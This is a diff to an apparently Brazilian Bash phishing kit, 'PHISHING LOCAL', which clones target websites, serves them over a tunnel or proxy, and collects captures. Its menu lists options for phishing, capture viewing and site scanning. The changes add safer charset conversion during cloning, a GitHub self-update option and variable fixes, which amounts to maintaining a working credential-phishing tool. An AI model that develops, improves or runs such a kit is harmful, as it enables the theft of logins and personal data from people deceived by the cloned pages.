@@ -1,12 +1,12 @@
 #!/bin/bash
 # ============================================
-# 🎣 PHISHING LOCAL v48 - Clonador Profissional
+# 🎣 PHISHING LOCAL v49 - Clonador Profissional
 # 1 Phish 2 Capturas 3 Túnel 4 Histórico 5 Localhost 6 Link 7 Status 8 Parar 9 Proxy 0 Sair
 # ============================================
 
 RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
 CYAN='\033[0;36m'; PURPLE='\033[0;35m'; WHITE='\033[1;37m'; NC='\033[0m'
-VERSAO="48"
+VERSAO="49"
 
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 
@@ -203,7 +203,12 @@ clone_site() {
     # Charset
     local ct=$(file -bi "$SITE_DIR/index.html" 2>/dev/null | grep -oE 'charset=[^;]+' || echo "")
     if ! echo "$ct" | grep -qi "utf-8"; then
-        iconv -f ISO-8859-1 -t UTF-8 "$SITE_DIR/index.html" 2>/dev/null > "$SITE_DIR/.tmp.html" && mv "$SITE_DIR/.tmp.html" "$SITE_DIR/index.html" 2>/dev/null
+        iconv -f ISO-8859-1 -t UTF-8 "$SITE_DIR/index.html" 2>/dev/null > "$SITE_DIR/.tmp.html"
+        if [ -s "$SITE_DIR/.tmp.html" ]; then
+            mv "$SITE_DIR/.tmp.html" "$SITE_DIR/index.html" 2>/dev/null || cp "$SITE_DIR/.tmp.html" "$SITE_DIR/index.html" 2>/dev/null
+        else
+            rm -f "$SITE_DIR/.tmp.html"
+        fi
     fi
 
     # Detectar bloqueio
@@ -1111,6 +1116,7 @@ while true; do
     echo -e "  ${RED}[8] PARAR${NC}      Servidor + tunel"
     echo -e "  ${PURPLE}[9] PROXY${NC}      Clonar via proxy"
     echo -e "  ${GREEN}[c] SALVOS${NC}     Biblioteca de clones"
+    echo -e "  ${CYAN}[A] ATUALIZAR${NC}  Puxar do GitHub"
     echo ""
     echo -e "  ${RED}[0] SAIR${NC}"
     echo ""
@@ -1129,11 +1135,11 @@ while true; do
 
             # SCAN ANTES DE CLONAR
             echo -e "${YELLOW}[...] Escaneando site...${NC}"
-            local scan_result=$(scan_site "$URL")
-            local scan_fw=$(echo "$scan_result" | cut -d"#" -f1)
-            local scan_cms=$(echo "$scan_result" | cut -d"#" -f2)
-            local scan_sec=$(echo "$scan_result" | cut -d"#" -f3)
-            local scan_title=$(echo "$scan_result" | cut -d"#" -f5)
+            scan_result=$(scan_site "$URL")
+            scan_fw=$(echo "$scan_result" | cut -d"#" -f1)
+            scan_cms=$(echo "$scan_result" | cut -d"#" -f2)
+            scan_sec=$(echo "$scan_result" | cut -d"#" -f3)
+            scan_title=$(echo "$scan_result" | cut -d"#" -f5)
 
             echo ""
             echo -e "  ${PURPLE}╔═══════════════════════════════════╗${NC}"
@@ -1259,6 +1265,25 @@ while true; do
         8) stop_all; read ;;
         9) do_proxy_clone ;;
         c) show_saved_clones ;;
+        A)
+            clear
+            echo -e "  ${CYAN}═══ ATUALIZAR DO GITHUB ═══${NC}"
+            echo ""
+            echo -n "  Puxando atualizacoes..."
+            if timeout 60 git pull --quiet 2>/dev/null; then
+                echo -e " ${GREEN}OK${NC}"
+                chmod +x phish start.sh phish-update.sh 2>/dev/null
+                echo ""
+                echo -e "  ${GREEN}Atualizado com sucesso!${NC}"
+                echo -e "  ${YELLOW}Reinicie o phish para aplicar: 0) SAIR e abra de novo${NC}"
+            else
+                echo -e " ${RED}FALHA${NC}"
+                echo -e "  ${YELLOW}Rede indisponivel ou sem mudancas${NC}"
+            fi
+            echo ""
+            echo -e "${YELLOW}Press Enter...${NC}"
+            read
+            ;;
         0) stop_all; exit 0 ;;
         *) echo -e "${RED}Invalido!${NC}" ;;
     esac
